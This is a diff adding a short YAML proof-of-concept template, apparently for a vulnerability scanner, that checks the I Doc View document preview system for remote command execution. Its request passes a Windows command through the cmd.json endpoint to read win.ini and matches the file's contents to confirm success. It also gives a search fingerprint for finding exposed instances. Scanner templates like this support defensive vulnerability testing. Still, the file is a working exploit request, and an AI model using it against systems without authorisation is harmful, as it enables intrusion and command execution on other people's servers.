@@ -1,0 +1,24 @@
+id: poc-yaml-i-doc-view-odps-cmd-rce
+info:
+  name: I Doc View在线文档预览系统 cmd 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: I Doc View
+  fofa: I Doc View在线文档预览
+requests:
+- method: GET
+  path: /system/cmd.json?cmd=type+c:\\Windows\win.ini
+  expression: 'status_code == 200 &&
+
+    contains(body,"bit app support") &&
+
+    contains(body,"[files]") &&
+
+    contains(body,"data") &&
+
+    contains(headers,"application/json")
+
+    '
+variables: {}
+transport: http
